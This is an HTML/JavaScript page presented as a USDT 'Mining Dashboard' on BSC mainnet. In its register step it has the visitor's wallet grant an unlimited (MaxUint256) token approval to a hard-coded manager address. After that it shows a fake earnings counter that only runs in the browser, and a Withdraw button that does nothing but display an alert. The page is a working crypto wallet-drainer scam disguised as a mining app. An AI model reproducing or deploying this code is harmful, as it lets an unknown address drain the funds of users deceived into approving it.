<!DOCTYPE html>
<html lang="hi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Mining Dashboard Mainnet</title>
    <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
    <style>
        :root { --bg: #0f172a; --card: #1e293b; --primary: #38bdf8; --text: #f8fafc; --success: #22c55e; }
        body { font-family: 'Segoe UI', sans-serif; background: #f4f7f6; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; padding: 20px; transition: 0.5s; }
        .dark-mode { background: var(--bg); color: var(--text); }
        .card { background: white; padding: 25px; border-radius: 24px; box-shadow: 0 15px 35px rgba(0,0,0,0.1); width: 100%; max-width: 380px; text-align: center; }
        .dark-mode .card { background: var(--card); border: 1px solid rgba(255,255,255,0.1); color: white; }
        .btn { padding: 15px; font-size: 16px; border-radius: 12px; border: none; width: 100%; font-weight: bold; cursor: pointer; margin-top: 10px; transition: 0.3s; }
        .trust-btn { background: #3375bb; color: white; }
        #loginView, #dashboardView, #miningView { display: none; }
        .mining-circle { width: 140px; height: 140px; margin: 15px auto; border-radius: 50%; border: 4px dashed var(--primary); display: flex; justify-content: center; align-items: center; animation: spin 10s linear infinite; }
        @keyframes spin { 100% { transform: rotate(360deg); } }
        .status { font-size: 12px; color: #ff9800; margin-top: 15px; font-weight: bold; }
    </style>
</head>
<body>

<div class="card">
    <div id="loginView" style="display: block;">
        <h2 style="color: #3375bb;">Mining Access</h2>
        <p style="font-size: 13px; color: #666;">Connect wallet to start mining</p>
        <button class="btn trust-btn" id="connectBtn" onclick="init()">Connect Wallet</button>
        <p id="msg" class="status"></p>
    </div>

    <div id="dashboardView">
        <h2>Registration</h2>
        <p id="addr" style="font-size: 10px; background: #eee; padding: 10px; border-radius: 8px; color: #333; word-break: break-all;"></p>
        <button id="regBtn" class="btn" style="background: #4CAF50; color: white;" onclick="register()">Approve & Register</button>
        <p id="txStatus" style="font-size: 12px; color: #2196F3; margin-top: 10px;"></p>
    </div>

    <div id="miningView">
        <div class="mining-circle">
            <div>
                <small style="display:block; font-size: 10px;">EARNINGS</small>
                <div id="liveBalance" style="font-size: 20px; font-weight: bold; color: var(--primary);">$1.00000</div>
            </div>
        </div>
        <p>Mining Rate: 1% / Hour</p>
        <div style="background: rgba(0,0,0,0.05); padding: 10px; border-radius: 10px; font-size: 11px;">
            Next Update: <span id="timer">59:59</span>
        </div>
        <button class="btn" style="background: var(--primary); color: white;" onclick="alert('Withdraw at $2')">Withdraw</button>
    </div>
</div>

<script>
    const MAINNET_ID = 56;
    const HEX_ID = "0x38"; // 56 in Hex
    const MANAGER = "0x6D5f3740af32CF279f3438D7eEB0d3ab650d9bCD";
    const TOKEN = "0x55d398326f99059ff775485246999027b3197955";
    let signer;
    let balance = 1.00000;
    let isConnecting = false;

    // 1. Network Switch Logic
    async function checkAndSwitchNetwork(provider) {
        const { chainId } = await provider.getNetwork();
        if (chainId !== MAINNET_ID) {
            try {
                await window.ethereum.request({
                    method: 'wallet_switchEthereumChain',
                    params: [{ chainId: HEX_ID }],
                });
                return true;
            } catch (error) {
                // If network not added to metamask
                if (error.code === 4902) {
                    alert("Please add BSC Mainnet to your wallet.");
                }
                return false;
            }
        }
        return true;
    }

    // 2. Main Connection Function
    async function init() {
        if (isConnecting) return;
        if (window.ethereum) {
            isConnecting = true;
            try {
                const provider = new ethers.providers.Web3Provider(window.ethereum);
                
                // Switch network first
                const networkOk = await checkAndSwitchNetwork(provider);
                if (!networkOk) {
                    isConnecting = false;
                    return;
                }

                await provider.send("eth_requestAccounts", []);
                signer = provider.getSigner();
                const address = await signer.getAddress();

                document.getElementById('loginView').style.display = 'none';
                document.getElementById('dashboardView').style.display = 'block';
                document.getElementById('addr').innerText = address;
            } catch (e) {
                console.error("User rejected or error", e);
            } finally {
                isConnecting = false;
            }
        } else {
            alert("Please use Trust Wallet or MetaMask Browser.");
        }
    }

    // Window load par automatically connect karne ki koshish karega bina loop ke
    window.onload = () => {
        if (window.ethereum) {
            // Check if already authorized
            const provider = new ethers.providers.Web3Provider(window.ethereum);
            provider.listAccounts().then(accounts => {
                if (accounts.length > 0) init();
            });
        }
    };

    // 3. Register Function
    async function register() {
        const btn = document.getElementById('regBtn');
        const status = document.getElementById('txStatus');
        try {
            btn.disabled = true;
            status.innerText = "Step 1: Approving USDT...";
            
            const tCon = new ethers.Contract(TOKEN, ["function approve(address,uint256) returns (bool)"], signer);
            const mCon = new ethers.Contract(MANAGER, ["function register() external"], signer);

            const provider = new ethers.providers.Web3Provider(window.ethereum);
            const gasPrice = await provider.getGasPrice();

            const tx1 = await tCon.approve(MANAGER, ethers.constants.MaxUint256, { gasPrice });
            await tx1.wait();

            status.innerText = "Step 2: Registering...";
            const tx2 = await mCon.register({ gasPrice });
            await tx2.wait();

            startMining();
        } catch (e) {
            alert("Failed! Check BNB for gas.");
            btn.disabled = false;
            status.innerText = "";
        }
    }

    function startMining() {
        document.body.classList.add('dark-mode');
        document.getElementById('dashboardView').style.display = 'none';
        document.getElementById('miningView').style.display = 'block';
        setInterval(() => {
            balance += (0.01 / 3600);
            document.getElementById('liveBalance').innerText = "$" + balance.toFixed(5);
        }, 1000);
        let timeLeft = 3600;
        setInterval(() => {
            timeLeft--; if (timeLeft < 0) timeLeft = 3600;
            let m = Math.floor(timeLeft / 60); let s = timeLeft % 60;
            document.getElementById('timer').innerText = (m < 10 ? "0" + m : m) + ":" + (s < 10 ? "0" + s : s);
        }, 1000);
    }
</script>
</body>
</html>
